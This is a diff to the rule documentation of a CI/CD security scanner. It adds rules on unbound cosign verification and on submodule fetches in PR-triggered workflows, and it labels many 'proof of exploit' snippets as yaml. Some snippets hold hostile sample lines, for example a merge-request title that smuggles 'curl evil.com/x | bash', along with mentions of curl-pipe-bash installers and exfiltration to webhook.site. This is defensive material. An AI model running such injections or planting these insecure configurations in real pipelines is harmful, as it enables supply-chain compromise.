+```yaml
 # Vulnerable: caches the whole home dir, which contains
 # the ``.npmrc`` the prior step seeded with the
 # publish token. Any contributor whose PR run hits the
@@ -10789,7 +10795,7 @@ Self-hosted labels (any value that doesn't match a hosted image label) are not f
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``ubuntu-18.04`` was retired 2023-04-01.
 # GitHub rerouted those jobs to a newer image and the
 # action.yml's PATH and pre-installed toolchain shifted
@@ -10841,7 +10847,7 @@ The consumer list covers the canonical cloud-credentials actions (``aws-actions/
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``id-token: write`` granted, no step
 # consumes the token. Any later step that's compromised
 # (action upstream takeover, run injection, cache
@@ -10897,7 +10903,7 @@ The rule pairs with GHA-023 (TLS / cert verify bypass) on the HTTPS side and wit
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ssh-keyscan accepts whatever the network
 # returns. A self-hosted runner on a compromised LAN, or
 # a GitHub-hosted runner with a DNS-spoofed upstream,
@@ -10951,7 +10957,7 @@ Out of scope: ``shell: bash`` / ``shell: sh`` on a Windows runner. Bash is prein
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: pwsh on Linux. A reviewer reads the
 # script with bash eyes, an injection in ``$INPUT``
 # might pass bash quoting but fire under pwsh parsing.
@@ -11000,7 +11006,7 @@ A step's ``env:`` block at the step level is the safe default and stays silent. 
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``DEPLOY_TOKEN`` is on the JOB ``env:``,
 # so every step's process inherits the secret. Only the
 # ``deploy`` step actually uses it; the ``checkout`` and
@@ -11051,7 +11057,7 @@ Out of scope (deliberate carve-out): secret names that appear only inside ``secr
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: the reusable declares ``DEPLOY_TOKEN`` as
 # required, but the body never references it. Every
 # caller forward a real secret value for no reason.
@@ -11111,7 +11117,7 @@ Branch wildcards in ``branches-ignore:`` are not flagged (they restrict triggers
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: workflow triggers on any branch starting with
 # ``main``, then deploys to the ``production`` environment.
 # A user with push access creates branch ``main-evil``, the
@@ -11176,7 +11182,7 @@ Pairs with GHA-033 (which covers ``set -x`` shell-trace leaks and direct ``echo 
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``${TOKEN:0:8}`` is an 8-char prefix of the
 # secret. GitHub's masker registers ``TOKEN`` to redact
 # the *full* value; the truncated substring is a different
@@ -11227,7 +11233,7 @@ jobs:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``actons/checkout`` (missing ``i``) compiles
 # fine and pulls from a namespace that anyone could have
 # registered. Reviewer eyes skim past the typo.
@@ -11267,7 +11273,7 @@ jobs:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: archived upstream still in use. The next
 # discovered vulnerability in the action's runtime won't
 # get a fix; the namespace is eligible for repojacking
@@ -11308,7 +11314,7 @@ jobs:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: the SHA below resolves only against a fork's
 # commit pool. ``actions/checkout`` itself never carried
 # this commit, but GitHub still serves it via the fork-
@@ -11349,7 +11355,7 @@ jobs:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: the upstream owner deleted the org.
 # pipeline-check's resolver got a 404 on /repos/legacy/
 # abandoned. The slug is now registrable by anyone, and a
@@ -11396,7 +11402,7 @@ The fire condition is the *order*, capture-then-fetch with no intervening lock o
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: two reads of the PR head, with a gate in
 # between. A contributor force-push between the snapshot
 # and the second checkout lets unreviewed code run with
@@ -11471,7 +11477,7 @@ Pairs with GHA-033 (secret echoed in shell trace) and GHA-087 (derived-value of 
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: the pinned SHA is the current ``main`` tip.
 # The maintainer's next push moves ``main`` forward; the
 # pin stays on the old commit but a Dependabot ``main``-
@@ -11512,7 +11518,7 @@ jobs:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: pinned to a version with a known advisory.
 - uses: actions/download-artifact@v4.1.6
 
@@ -11541,7 +11547,7 @@ The topology creates a persistence loop: the workflow's own PR triggers the work
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: workflow triggers on PR, creates a new PR,
 # and auto-merges it, creating a self-sustaining loop.
 on: pull_request
@@ -11597,7 +11603,7 @@ Detection reuses the same credential-pattern catalog as GHA-008 (``find_secret_v
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a deploy job carries a production AWS key
 # as a plaintext env var instead of a secrets reference.
 jobs:
@@ -11624,6 +11630,97 @@ jobs:
 
 **Source:** [`GHA-099`](../providers/github.md#gha-099) in the [GitHub Actions provider](../providers/github.md).
 
+### `GHA-100`: ``cosign verify`` without certificate identity binding <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-100 }
+
+**Evidences:** [`6.3.3`](#ctrl-6-3-3) All system components protected from known vulnerabilities by installing applicable patches, [`6.5.1`](#ctrl-6-5-1) Changes to system components follow secure development procedures.
+
+**How this is detected.** Scans ``run:`` blocks for ``cosign verify`` and ``cosign verify-blob`` invocations. Flags when either ``--certificate-identity`` / ``--certificate-identity-regexp`` or ``--certificate-oidc-issuer`` / ``--certificate-oidc-issuer-regexp`` is absent from the command line.
+
+The ``cosign verify-attestation`` subcommand is also checked because it shares the same identity-binding requirement.
+
+Multi-line ``run:`` blocks (``|`` / ``>`` YAML scalars) are handled by scanning the full scalar value. Backslash continuations are collapsed before matching so a split invocation like ``cosign verify \\\n  --key ...`` is still detected.
+
+This rule is the consumer-side complement of GHA-006 (missing artifact signing) and GHA-024 (missing SLSA provenance). GHA-100 catches the case where signing exists but the verification step doesn't bind the signer's identity.
+
+**Recommendation.** Add both ``--certificate-identity`` (or ``--certificate-identity-regexp``) AND ``--certificate-oidc-issuer`` (or ``--certificate-oidc-issuer-regexp``) to every ``cosign verify`` / ``cosign verify-blob`` invocation. Pin the identity to the expected build pipeline's workflow ref and the issuer to ``https://token.actions.githubusercontent.com`` (for GitHub Actions OIDC). Without both flags, any Sigstore signer's certificate satisfies the verification.
+
+**Known false positives.**
+
+- Key-based verification (``--key``) doesn't use certificate identity flags. The rule checks for ``--key`` and suppresses the finding when present.
+
+**Seen in the wild.**
+
+- https://docs.sigstore.dev/cosign/verifying/verify/
+- https://blog.sigstore.dev/cosign-2-0-released/
+
+**Proof of exploit.**
+
+```yaml
+# Vulnerable: cosign verify without identity binding.
+# Any valid Sigstore signature satisfies the check.
+jobs:
+  verify-and-deploy:
+    runs-on: ubuntu-latest
+    steps:
+      - run: cosign verify ghcr.io/org/app:latest
+      - run: docker run ghcr.io/org/app:latest
+
+# Safe: pin certificate identity + OIDC issuer.
+jobs:
+  verify-and-deploy:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          cosign verify ghcr.io/org/app:latest \
+            --certificate-identity-regexp 'https://github.com/org/app/.*' \
+            --certificate-oidc-issuer https://token.actions.githubusercontent.com
+      - run: docker run ghcr.io/org/app:latest
+```
+
+**Source:** [`GHA-100`](../providers/github.md#gha-100) in the [GitHub Actions provider](../providers/github.md).
+
+### `GHA-102`: ``actions/checkout`` with submodule fetch on a PR trigger <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-102 }
+
+**Evidences:** [`6.4.1`](#ctrl-6-4-1) Public-facing web apps are protected against attacks (secure build/config), [`6.5.1`](#ctrl-6-5-1) Changes to system components follow secure development procedures.
+
+**How this is detected.** Fires on workflows triggered by ``pull_request`` or ``pull_request_target`` when any ``actions/checkout`` step sets ``with.submodules`` to ``true`` or ``recursive``. The rule does not require a subsequent build step: the submodule clone itself is the risk surface (lifecycle scripts, hooks, and build files execute during or immediately after the clone).
+
+``submodules: false`` (the default) is safe and does not fire.
+
+**Recommendation.** Remove ``submodules: true`` / ``submodules: recursive`` from checkout steps in PR-triggered workflows. If submodules are genuinely needed for the PR build, pin submodule URLs to trusted repositories in a ``.gitmodules`` file that lives on a protected branch and validate submodule origins before the build step runs. Alternatively, split the workflow: use a low-privilege ``pull_request`` job for code review checks (no submodules) and a ``push``-triggered job for builds that need submodule content.
+
+**Known false positives.**
+
+- Workflows that intentionally clone submodules on PRs for monorepo builds where all submodule URLs point at repos within the same organization. Suppress per-step if the submodule origin is validated before the build.
+
+**Proof of exploit.**
+
+```yaml
+# Vulnerable: a PR can modify .gitmodules to point at an
+# attacker-controlled repo. The recursive checkout clones it
+# and the subsequent build step executes its code.
+on: pull_request
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@<sha>
+        with:
+          submodules: recursive
+      - run: npm ci && npm run build
+
+# Safe: no submodule fetch on the PR trigger.
+on: pull_request
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@<sha>
+      - run: npm ci && npm run build
+```
+
+**Source:** [`GHA-102`](../providers/github.md#gha-102) in the [GitHub Actions provider](../providers/github.md).
+
 ### `GL-001`: Image not pinned to specific version or digest <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gl-001 }
 
 **Evidences:** [`6.3.3`](#ctrl-6-3-3) All system components protected from known vulnerabilities by installing applicable patches.
@@ -11636,7 +11733,7 @@ jobs:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``image: node:20`` is a mutable tag. Docker
 # Hub's node team rebuilds it on every Node point
 # release; a publisher takeover ships code into every
@@ -11667,7 +11764,7 @@ build:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: an MR titled ``feat: shiny new thing";
 # curl evil.com/x | bash;"`` executes the curl in the
 # build's shell context. The MR author needs no special
@@ -11702,7 +11799,7 @@ build:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: literal AWS access key in pipeline-level
 # ``variables:``. The ``.gitlab-ci.yml`` is committed
 # to git, printed in build logs whenever a job echoes
@@ -11745,7 +11842,7 @@ deploy:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``include:`` pulls a remote project without
 # a pinned ref. ``ref:`` defaults to ``HEAD`` of the
 # default branch; whoever can push to that branch on
@@ -11800,11 +11897,11 @@ include:
 
 **Known false positives.**
 
-- Test fixtures and documentation blobs sometimes embed credential-shaped strings (JWT samples, AKIAI... examples). The AWS canonical example ``AKIAIOSFODNN7EXAMPLE`` is deliberately NOT suppressed, if it appears in a real pipeline it almost always means a copy-paste from docs was never substituted. Defaults to LOW confidence.
+- Test fixtures and documentation blobs sometimes embed credential-shaped strings (JWT samples, vendor example keys). Well-known vendor example tokens (``AKIAIOSFODNN7EXAMPLE``, Stripe ``sk_test_`` docs keys) are suppressed via the ``VENDOR_EXAMPLE_TOKENS`` allowlist. Defaults to LOW confidence.
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a credential-shaped literal in a job env
 # / inline script / variables block. Same leak surface
 # as GL-003 plus the additional gap that build-time
@@ -11846,7 +11943,7 @@ deploy:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: every run of ``deploy`` downloads the binary
 # from ``vendor-team/build``'s latest pipeline and executes
 # it. If that upstream project accepts MR pipelines, an MR
@@ -11895,7 +11992,7 @@ deploy:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: the pipeline ``include:``s a local file
 # that any MR can modify, on an MR-triggered pipeline.
 # A merge request can rewrite ``ci/build.yml`` and
@@ -11980,7 +12077,7 @@ include:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``curl | bash`` install one-liner trusts
 # both the network path and the installer host. A
 # MITM or compromised endpoint ships malicious code
@@ -12014,7 +12111,7 @@ install:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``docker run --privileged`` plus the host
 # Docker socket inside a GitLab Runner job gives the
 # container full kernel access. A compromise escapes
@@ -12051,7 +12148,7 @@ integration:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: pip uses a plaintext-HTTP index and
 # ``--trusted-host`` silences hash verification.
 install:
@@ -12093,7 +12190,7 @@ install:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``CI_JOB_TOKEN`` is meant to live only for the
 # duration of the current job — GitLab revokes it when the
 # job ends. Persisting it into a file (especially a dotenv
@@ -12159,7 +12256,7 @@ package:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``npm config set strict-ssl false`` (or
 # ``git config http.sslverify false`` /
 # ``NODE_TLS_REJECT_UNAUTHORIZED=0``) disables TLS for
@@ -12208,7 +12305,7 @@ install:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a job body executes a base64-decoded
 # payload, exfils to ``webhook.site``, or runs a known
 # miner binary. A malicious MR (or a compromised co-
@@ -12241,7 +12338,7 @@ build:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``eval`` on a CI variable or extends'd
 # input gives that value full shell-grammar reach.
 # A run-pipeline variable carrying metacharacters
@@ -12281,7 +12378,7 @@ deploy:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``services:`` references mutable image
 # tags. A publisher repoint (or namespace takeover) on
 # the services image swaps the code that runs alongside
@@ -12324,7 +12421,7 @@ integration:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``trigger:`` ``include:`` pulls a child
 # pipeline definition from a remote project without
 # pinning the ref. Whoever can push to that project's
@@ -12360,7 +12457,7 @@ deploy:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``id_tokens:`` mints a JWT with no
 # ``aud:`` pin and no environment binding. The token's
 # subject claim accepts any ref / branch, so an MR
@@ -12403,7 +12500,7 @@ deploy:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``tags:`` interpolates a CI variable. A
 # pusher controls ``$CI_COMMIT_REF_NAME`` (the branch
 # name) and can name their MR branch after a privileged
@@ -12449,7 +12546,7 @@ for direct interpolation of the same attacker-controllable predefined variables 
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a global ``before_script:`` (or
 # ``after_script:``) interpolates an untrusted CI
 # variable. The injected metacharacters then execute
@@ -12555,7 +12652,7 @@ v1 charts (HELM-001) are skipped. They predate ``Chart.lock`` and use ``requirem
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``Chart.yaml`` declares a redis dependency by
 # version range but ``Chart.lock`` is absent. ``helm
 # dependency build`` resolves the range against whatever the
@@ -12608,7 +12705,7 @@ generated: "2026-01-15T10:30:00Z"
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``helm dependency build`` fetches the redis
 # tarball over plaintext HTTP. Any on-path attacker
 # (compromised proxy, malicious WiFi, BGP hijack on the
@@ -12748,7 +12845,7 @@ dependencies:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: CodeBuild service role with AdministratorAccess.
 # (Terraform shown for clarity; the actual finding comes from
 # live ListAttachedRolePolicies on the role.)
@@ -12795,7 +12892,7 @@ resource "aws_iam_role_policy" "codebuild_least_priv" {
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: the role can do literally anything in S3.
 # Any compromise of any pipeline that assumes this role
 # (poisoned action, leaked credential, malicious build
@@ -12856,7 +12953,7 @@ resource "aws_iam_role_policy" "codebuild_least_priv" {
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: pipeline role grants PassRole with Resource: '*'.
 {
   "Version": "2012-10-17",
@@ -12905,7 +13002,7 @@ resource "aws_iam_role_policy" "codebuild_least_priv" {
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a role with a cross-account trust policy
 # missing ``sts:ExternalId`` in its Condition. The
 # Confused Deputy problem: a third-party SaaS (or
@@ -12961,7 +13058,7 @@ resource "aws_iam_role_policy" "codebuild_least_priv" {
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: an IAM user has an active access key older
 # than 90 days. Long-lived keys accumulate exposure: any
 # leak (laptop theft, .aws/credentials gitignore miss,
@@ -13001,7 +13098,7 @@ iam.delete_access_key(
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: an OIDC-federated IAM role's trust policy
 # is missing either the audience (``:aud``) check or
 # the subject (``:sub``) pin. Any OIDC token from the
@@ -13051,7 +13148,7 @@ iam.delete_access_key(
 
 **Proof of exploit.**
 
-```
+```yaml
 // Vulnerable: every build resolves @main against the
 // shared-library repo. A push to main (legitimate update
 // from a teammate, a credential leak, a compromised
@@ -13102,7 +13199,7 @@ pipeline {
 
 **Proof of exploit.**
 
-```
+```yaml
 // Vulnerable: ``$CHANGE_BRANCH`` (or ``$GIT_BRANCH`` /
 // ``$ghprbSourceBranch`` / ``$BUILD_USER``) comes from
 // branch metadata or build cause. A branch named
@@ -13198,7 +13295,7 @@ pipeline {
 
 **Evidences:** [`6.5.1`](#ctrl-6-5-1) Changes to system components follow secure development procedures, [`8.2.1`](#ctrl-8-2-1) Strong unique identifiers are assigned to each user and service account.
 
-**How this is detected.** Scans the raw Jenkinsfile text against the cross-provider credential-pattern catalog. Secrets committed to Groovy source are visible in every fork and every build log.
+**How this is detected.** Scans the raw Jenkinsfile text against the cross-provider credential-pattern catalog. Values inside ``environment {}`` blocks also run through the keyed-hex and entropy passes (which need YAML-key context to fire). Secrets committed to Groovy source are visible in every fork and every build log.
 
 **Recommendation.** Rotate the exposed credential. Move the value to a Jenkins credential and reference it via `withCredentials([string(credentialsId: '…', variable: '…')])`.
 
@@ -13206,11 +13303,11 @@ pipeline {
 
 **Known false positives.**
 
-- Test fixtures and documentation blobs sometimes embed credential-shaped strings (JWT samples, AKIAI... examples). The AWS canonical example ``AKIAIOSFODNN7EXAMPLE`` is deliberately NOT suppressed, if it appears in a real pipeline it almost always means a copy-paste from docs was never substituted. Defaults to LOW confidence.
+- Test fixtures and documentation blobs sometimes embed credential-shaped strings (JWT samples, vendor example keys). Well-known vendor example tokens (``AKIAIOSFODNN7EXAMPLE``, Stripe ``sk_test_`` docs keys) are suppressed via the ``VENDOR_EXAMPLE_TOKENS`` allowlist. Defaults to LOW confidence.
 
 **Proof of exploit.**
 
-```
+```yaml
 // Vulnerable: a credential-shaped literal in the
 // Jenkinsfile body. Any repo reader sees it; the
 // console log echoes it whenever the step prints env.
@@ -13262,7 +13359,7 @@ pipeline {
 
 **Proof of exploit.**
 
-```
+```yaml
 // Vulnerable: ``image 'maven:3.9'`` is a mutable tag.
 // Docker Hub's maven team rebuilds it on every Maven
 // point release; a publisher takeover ships code into
@@ -13305,7 +13402,7 @@ pipeline {
 
 **Proof of exploit.**
 
-```
+```yaml
 // Vulnerable: long-lived AWS keys hard-coded in
 // ``environment { }`` block. Same leak surface as
 // JF-008 plus the long-lived-credential gap (no
@@ -13377,7 +13474,7 @@ pipeline {
 
 **Proof of exploit.**
 
-```
+```yaml
 // Vulnerable: ``app-build`` is a multibranch job that runs
 // on every PR branch. A contributor opens a PR, the PR
 // build produces a malicious ``release.jar`` as its
@@ -13467,7 +13564,7 @@ pipeline {
 
 **Proof of exploit.**
 
-```
+```yaml
 // Vulnerable: ``curl | bash`` install one-liner trusts
 // both the network path and the installer host. A
 // MITM or compromised endpoint runs in the build's
@@ -13516,7 +13613,7 @@ pipeline {
 
 **Proof of exploit.**
 
-```
+```yaml
 // Vulnerable: ``docker run --privileged`` plus the
 // host Docker socket inside a Jenkins agent gives the
 // container full kernel access and the agent's
@@ -13564,7 +13661,7 @@ pipeline {
 
 **Proof of exploit.**
 
-```
+```yaml
 // Vulnerable: pip uses a plaintext-HTTP index and
 // ``--trusted-host`` silences hash verification.
 pipeline {
@@ -13610,7 +13707,7 @@ pipeline {
 
 **Proof of exploit.**
 
-```
+```yaml
 // Vulnerable: ``Runtime.getRuntime().exec(...)`` bypasses
 // the script-security sandbox and runs arbitrary commands
 // in the Jenkins controller's JVM. The controller has
@@ -13704,7 +13801,7 @@ pipeline {
 
 **Proof of exploit.**
 
-```
+```yaml
 // Vulnerable: ``git -c http.sslverify=false clone``
 // (or ``npm config set strict-ssl false``,
 // ``NODE_TLS_REJECT_UNAUTHORIZED=0``) disables
@@ -13761,7 +13858,7 @@ pipeline {
 
 **Proof of exploit.**
 
-```
+```yaml
 // Vulnerable: a Kubernetes agent pod template runs
 // containers as privileged and mounts hostPath. The
 // agent pod escapes to the node; the node hosts every
@@ -13858,7 +13955,7 @@ pipeline {
 
 **Proof of exploit.**
 
-```
+```yaml
 // Vulnerable: a stage body executes a base64-decoded
 // payload, exfils to a third-party webhook, or runs a
 // known miner binary. A malicious PR (or a compromised
@@ -13905,7 +14002,7 @@ pipeline {
 
 **Proof of exploit.**
 
-```
+```yaml
 // Vulnerable: ``eval`` on a value that came from a
 // build parameter (or any non-step source) gives the
 // value full shell-grammar reach. The same shape
@@ -13970,7 +14067,7 @@ pipeline {
 
 **Proof of exploit.**
 
-```
+```yaml
 // Vulnerable: ``agent { label "${env.LABEL_PARAM}" }``
 // or ``agent { label "$JOB_BASE_NAME" }`` lets the
 // pusher pick which agent runs the job. A branch /
@@ -14011,7 +14108,7 @@ pipeline {
 
 **Proof of exploit.**
 
-```
+```yaml
 // Vulnerable: Groovy interpolates ``${PASSWORD}`` INTO
 // the sh body BEFORE the shell sees it. The actual
 // secret value lands in the rendered script in plain
@@ -14063,7 +14160,7 @@ pipeline {
 
 **Proof of exploit.**
 
-```
+```yaml
 // Vulnerable: ``password()`` build parameters are NOT
 // stored encrypted at rest; they live in the build's
 // metadata as plain text, are visible to anyone with
@@ -14117,7 +14214,7 @@ pipeline {
 
 **Proof of exploit.**
 
-```
+```yaml
 // Vulnerable: ``httpRequest`` with
 // ``ignoreSslErrors: true`` disables certificate
 // verification on the request. A MITM proxy or DNS
@@ -14165,7 +14262,7 @@ pipeline {
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``image: nginx:1.25`` is a mutable tag.
 # Docker Hub's nginx team rebuilds it on every point
 # release; a publisher takeover repoints the tag
@@ -14209,7 +14306,7 @@ spec:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``hostNetwork: true`` makes the Pod share
 # the node's network namespace. The Pod can sniff every
 # other Pod's traffic on the node, bind privileged
@@ -14250,7 +14347,7 @@ spec:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``hostPID: true`` lets the Pod see every
 # process on the node. A compromise of the Pod can
 # ``ps aux`` for credentials in other containers'
@@ -14290,7 +14387,7 @@ spec:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``hostIPC: true`` shares the node's IPC
 # namespace. Pods on the node can read each other's
 # POSIX shared memory, semaphores, and message queues —
@@ -14329,7 +14426,7 @@ spec:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``privileged: true`` gives the container the
 # equivalent of root on the node — full ``/dev`` access,
 # every Linux capability, and the ability to bypass
@@ -14386,7 +14483,7 @@ spec:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``allowPrivilegeEscalation`` defaults to
 # ``true``. A non-root process inside the container
 # can gain elevated capabilities through suid binaries
@@ -14432,7 +14529,7 @@ spec:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``runAsNonRoot`` not declared (or
 # explicitly false) AND ``runAsUser`` not set lets the
 # image's default user run the container — for most
@@ -14492,7 +14589,7 @@ Most stateless services need no capabilities at all. Avoid ``SYS_ADMIN`` (effect
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: no ``capabilities`` block means the
 # container starts with the default Linux capability
 # set (NET_RAW, NET_BIND_SERVICE, etc.). Worse:
@@ -14575,7 +14672,7 @@ spec:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: pod mounts the host's root filesystem.
 apiVersion: v1
 kind: Pod
@@ -14628,7 +14725,7 @@ spec:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``/var/run/docker.sock`` mounted into the
 # container exposes the Docker API as root on the node.
 # A compromised pod (RCE in app, malicious image) runs
@@ -14699,7 +14796,7 @@ spec:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a literal credential value in a container
 # ``env`` block. The Pod manifest is in etcd; anyone
 # with ``pods/get`` on the namespace reads the value.
@@ -14750,7 +14847,7 @@ spec:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a Kubernetes Secret with credential-shaped
 # literals in ``stringData`` (or base64'd in ``data``).
 # The Secret object is in etcd; ``kubectl get secret
@@ -14813,7 +14910,7 @@ spec:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: any pod that uses the ``default`` ServiceAccount
 # in the ``app`` namespace gets cluster-admin. A compromised
 # pod (RCE, poisoned image, malicious sidecar) can list
@@ -14875,7 +14972,7 @@ roleRef:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a Role / ClusterRole that grants verbs:
 # ["*"] on resources: ["*"]. Equivalent to admin on
 # the scope (namespace for Role, cluster for
@@ -14928,7 +15025,7 @@ rules:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a namespace with no Pod Security Admission
 # label. Any Pod can land in it with no built-in
 # enforcement against privileged / hostPath / etc.
@@ -14976,7 +15073,7 @@ metadata:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a non-system workload uses
 # ``priorityClassName: system-cluster-critical`` or
 # ``system-node-critical``. Those classes are reserved
@@ -15026,7 +15123,7 @@ spec:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a LoadBalancer Service has no
 # ``loadBalancerSourceRanges``. The cloud provider
 # provisions a LB with a public IP open to 0.0.0.0/0.
@@ -15097,7 +15194,7 @@ spec:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a RoleBinding (or ClusterRoleBinding)
 # grants permissions to the ``default`` ServiceAccount
 # in a namespace. Every Pod in that namespace that
@@ -15155,7 +15252,7 @@ roleRef:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a workload has a ``tolerations`` entry
 # for ``node-role.kubernetes.io/control-plane`` AND
 # the matching ``nodeSelector``. The Pod gets
@@ -15253,7 +15350,7 @@ spec:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: explicit ``runAsUser: 0`` runs the
 # container as root inside its namespace. Combined
 # with the kernel's user-namespace mapping (or its
@@ -15315,7 +15412,7 @@ spec:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a ConfigMap with a credential-shaped
 # value. ConfigMaps are NOT encrypted at rest in etcd
 # (Secrets are, when encryption-at-rest is configured);
@@ -15391,7 +15488,7 @@ stringData:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``procMount: Unmasked`` removes the
 # default kernel-managed masks on ``/proc``. The
 # container can read kernel internals
@@ -15436,7 +15533,7 @@ spec:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a Service with ``externalIPs`` lets the
 # Service hijack traffic destined for those IPs on
 # any node in the cluster. CVE-2020-8554: an attacker
@@ -15478,7 +15575,7 @@ spec:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a RoleBinding grants permissions to
 # ``system:anonymous`` (or the
 # ``system:unauthenticated`` group). Anyone who can
@@ -15563,7 +15660,7 @@ roleRef:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a KMS key policy with ``Action: kms:*``
 # (or ``Action: '*'``) on ``Resource: '*'`` granted to
 # an IAM principal. The principal can ScheduleKeyDeletion
@@ -15618,7 +15715,7 @@ roleRef:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a Lambda function with no CodeSigningConfig
 # attached. Anyone with ``lambda:UpdateFunctionCode`` can
 # push arbitrary code without signature verification; a
@@ -15661,7 +15758,7 @@ lambdacli.update_function_configuration(
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a Lambda Function URL with
 # ``AuthType: NONE``. The URL is on the public internet
 # and requires no authentication. Anyone who learns the
@@ -15699,7 +15796,7 @@ lambdacli.update_function_url_config(
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a Lambda function carries credentials in
 # its environment variables in plaintext. The values
 # are visible to anyone with ``lambda:GetFunction``
@@ -15740,7 +15837,7 @@ lambdacli.update_function_configuration(
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: any AWS account on the internet can invoke
 # this function. If the function reads from S3, writes to
 # DynamoDB, or calls a downstream service, the attacker
@@ -15799,7 +15896,7 @@ Managed entries in ``<dependencyManagement>`` are NOT evaluated by this rule (th
 
 **Proof of exploit.**
 
-```
+```yaml
 <!-- Vulnerable: range admits a future patch version. -->
 <dependency>
   <groupId>org.example</groupId>
@@ -15855,7 +15952,7 @@ Managed entries in ``<dependencyManagement>`` are NOT evaluated by this rule (th
 
 **Proof of exploit.**
 
-```
+```yaml
 <!-- Vulnerable: Maven fetches every dependency tarball
      and pom from this repository over plaintext HTTP. Any
      on-path attacker (compromised proxy, malicious VPN
@@ -15936,7 +16033,7 @@ Managed entries in ``<dependencyManagement>`` are NOT evaluated by this rule (th
 
 **Proof of exploit.**
 
-```
+```yaml
 <!-- Vulnerable: pinned to a Log4Shell-affected version. -->
 <dependency>
   <groupId>org.apache.logging.log4j</groupId>
@@ -15994,7 +16091,7 @@ Managed entries in ``<dependencyManagement>`` are NOT evaluated by this rule (th
 
 **Proof of exploit.**
 
-```
+```yaml
 <!-- Vulnerable: bumping the version to a freshly-
      published release within hours of its appearance on
      Maven Central is exactly the window in which a
